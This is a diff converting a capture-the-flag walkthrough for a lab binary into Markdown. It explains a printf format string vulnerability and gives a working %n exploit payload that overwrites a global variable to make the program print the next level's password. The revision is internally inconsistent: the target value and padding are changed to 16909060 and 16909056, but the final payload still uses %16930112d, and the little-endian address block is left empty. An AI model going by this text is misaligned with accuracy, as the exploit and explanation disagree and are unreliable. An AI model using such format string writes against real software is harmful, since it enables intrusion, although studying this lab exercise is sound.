@@ -1,62 +1,85 @@
-=== Level4 Walkthrough ===
+# Level 4 Walkthrough
 
---- What the program does ---
+## What the program does
 
-main() calls n().
+`main()` calls `n()`.
 
-n() does:
-1) fgets(buffer, 512, stdin)
-	-> bounded read, no overflow
-2) p(buffer)
-3) if (m == 16930116) system("/bin/cat /home/user/level5/.pass")
+`n()` does:
 
-p() is:
-printf(buffer);
--> format string vulnerability (user controls format)
+1. `fgets(buffer, 512, stdin)`
+   - bounded read, no buffer overflow
+2. `p(buffer)`
+3. `if (m == 16909060) system("/bin/cat /home/user/level5/.pass")`
 
---- Goal ---
+`p()` is:
 
-Set global variable m to 16930116 (0x01025544) so the check passes.
+```c
+printf(str);
+```
 
---- Finding our buffer position on the stack ---
+This is a format string vulnerability because the user controls the format string.
 
-Input with marker:
+## Goal
+
+Set the global variable `m` to `16909060` (`0x01020304`) so the check passes.
+
+## Finding the buffer position on the stack
+
+Use this test input:
+
+```bash
 python -c 'print "aaaa" + " %x" * 15' | ./level4
+```
 
-Output shows 61616161 at position 12 -> buffer is at argument 12.
+When `61616161` appears in the output, it shows the buffer starts at argument `12`.
 
---- The key format string trick ---
+## The key format string trick
 
-%n writes the number of printed characters into an address.
-If we place the address of m on the stack, then use %12$n,
-printf will write the byte count into m.
+`%n` writes the number of printed characters into the address passed to it.
 
-We need printf to print exactly 16,930,116 characters.
+If we place the address of `m` on the stack, then use `%12$n`, `printf()` will write the current character count into `m`.
 
-We already printed 4 bytes for the address itself, so we need:
-16930116 - 4 = 16930112 more characters.
+We need `printf()` to print exactly `16,909,060` characters.
 
-We cannot send that many bytes because fgets only reads 512.
-Instead, we use the width specifier with %d:
-%16930112d -> makes printf print 16,930,112 characters by inserting spaces.
+The first 4 bytes are the address of `m`, so we still need:
 
---- Address of m ---
+```text
+16909060 - 4 = 16909056
+```
 
-m is at 0x08049810
-Little endian bytes: \x10\x98\x04\x08
+We cannot send that many literal bytes because `fgets()` only reads 512 bytes.
+Instead, we use a field width with `%d`:
 
---- Final payload ---
+```text
+%16909056d
+```
 
+This makes `printf()` print `16,909,056` characters by padding the output with spaces.
+
+## Address of `m`
+
+`m` is at `0x08049810`.
+
+Little-endian bytes:
+
+```text
+
+```
+
+## Final payload
+
+```bash
 (python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'; cat) | ./level4
+```
 
---- Why it works (short) ---
+## Why it works
 
-1) Address of m is placed at the start of the input (arg 12).
-2) printf prints 16,930,112 padded chars via %16930112d.
-3) Total printed so far = 4 + 16,930,112 = 16,930,116.
-4) %12$n writes that value into m.
-5) Check passes -> system() prints the password.
+1. The address of `m` is placed at the start of the input, which lands at argument `12`.
+2. `printf()` prints `16,909,056` padded characters via `%16909056d`.
+3. Total printed characters = `4 + 16,909,056 = 16,909,060`.
+4. `%12$n` writes that value into `m`.
+5. The comparison succeeds, so `system()` prints the password for level 5.
 
---- Result ---
+## Result
 
-Program prints /home/user/level5/.pass, use it to log in to level5.
+The program prints `/home/user/level5/.pass`; use that password to log in to level 5.
